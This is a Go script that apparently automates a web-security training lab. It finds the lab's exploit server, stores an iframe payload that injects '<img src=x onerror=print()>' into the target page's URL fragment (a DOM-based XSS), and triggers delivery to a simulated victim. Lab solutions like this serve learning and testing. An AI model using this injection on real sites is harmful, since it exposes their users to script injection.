package main

import (
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/PuerkitoBio/goquery"
)

func findExploitServer(host string) (string, error) {
	resp, err := http.Get(host)

	if err != nil {
		return "", fmt.Errorf("error acessing the host: %v", err)
	}

	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("host didn't returned ok status: %s", resp.Status)
	}

	doc, err := goquery.NewDocumentFromReader(resp.Body)

	if err != nil {
		return "", fmt.Errorf("error trying to parse HTML: %v", err)
	}

	exploitLink := doc.Find("#exploit-link").First()

	href, exists := exploitLink.Attr("href")

	if !exists {
		return "", fmt.Errorf("href not found with this id")
	}

	return href, nil
}

func verifyHost() (string, error) {
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run main.go <HOST>")
		fmt.Println("example: http://example.com")
		os.Exit(1)
	}

	host := os.Args[1]

	if !strings.HasPrefix(host, "http://") && !strings.HasPrefix(host, "https://") {
		return "", fmt.Errorf("host deve começar com 'http://' ou 'https://'")
	}

	if host == "" {
		fmt.Println("Error: host not found")
		os.Exit(1)
	}

	host = strings.TrimSuffix(host, "/")
	resp, err := http.Get(host)

	if err != nil {
		fmt.Printf("Error accessing the host: %v\n", err)
		os.Exit(1)
	}

	defer resp.Body.Close()

	return host, err
}

func sendExploit(host, exploitServer string) error {
	payload := fmt.Sprintf(`urlIsHttps=on & responseFile=/exploit & responseHead=HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8 & responseBody=<iframe src="%s/#" onload="this.src+='<img src=x onerror=print()>'"></iframe> & formAction=STORE`, host)
	resp, err := http.Post(exploitServer+"/exploit", "application/x-www-form-urlencoded", strings.NewReader(payload))
	if err != nil {
		return fmt.Errorf("error storing exploit: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unxpected response: %s", resp.Status)
	}

	if resp.StatusCode == 400 {
		return fmt.Errorf(resp.Status)
	}

	deliverExploit(exploitServer)
	fmt.Println("Exploit sended sucessfully!")
	return nil
}

func deliverExploit(exploitServer string) error {
	resp, err := http.Get(exploitServer + "/deliver-to-victim")
	if err != nil {
		return fmt.Errorf("error sending exploit: %v", err)
	}
	defer resp.Body.Close()
	return err
}

func main() {
	host, _ := verifyHost()
	exploitServer, _ := findExploitServer(host)
	sendExploit(host, exploitServer)
}
